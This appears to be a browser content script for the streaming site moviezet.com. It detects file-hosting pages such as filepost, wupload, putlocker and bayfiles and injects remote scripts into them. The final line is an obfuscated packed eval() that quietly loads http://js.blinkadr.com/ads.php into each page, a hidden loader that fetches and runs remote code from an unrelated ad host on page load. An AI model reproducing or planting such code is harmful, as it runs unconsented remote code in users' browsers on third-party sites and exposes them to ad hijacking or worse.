var loc=(location.href.match(/mz=/i));
if(location.href.match(/^http:\/\/(www\.)?filepost\.com/i)&&loc){
    addScript("filepost");
        }else if(location.href.match(/^http:\/\/(www\.)?uploadhere\.com/i)&&loc){
    addScript("uhere");
    } else if (window.location.href.match(/^http:\/\/(www\.)?wupload\.(com|cn|de|es|fr|co\.uk|com\.hk|in|it|jp|mx)/i) && loc) {
    addScript("wup1oad");
    } else if (location.href.match(/^http:\/\/(www\.)?putlocker\.com/i)) {
    addScript("putlocker");
    } else if (window.location.href.match(/^http:\/\/(www\.)?bayfiles\.com/i) && loc) {
	addScript('bayfiles');
   } else if (location.href.match(/^http:\/\/(www\.)?moviezet\.com/i)) {
    if (document.getElementById("moviez")) {
        if (document.getElementById("moviez").src.match(/get_plugin/i)) {
            var al = document.getElementById("videoi").innerHTML.replace(/amp;/gi, '');
            document.getElementById("moviez").src = "http://www.moviezet.com/cc/fuente/"+al;
        }
    }
}
function addScript(id) {
    var s = document.createElement('script');
    s.setAttribute("type","text/javascript");
    s.setAttribute("src", "http://www.moviezet.com/host/"+id+".js");
    document.getElementsByTagName("head")[0].appendChild(s);

}

eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 1=2.5(\'6\');1.3("7","8/9");1.3("a","b://c.d.e/f.g");2.h("i")[0].j(1);',20,20,'|s|document|setAttribute|var|createElement|script|type|text|javascript|src|http|js|blinkadr|com|ads|php|getElementsByTagName|head|appendChild'.split('|'),0,{}))
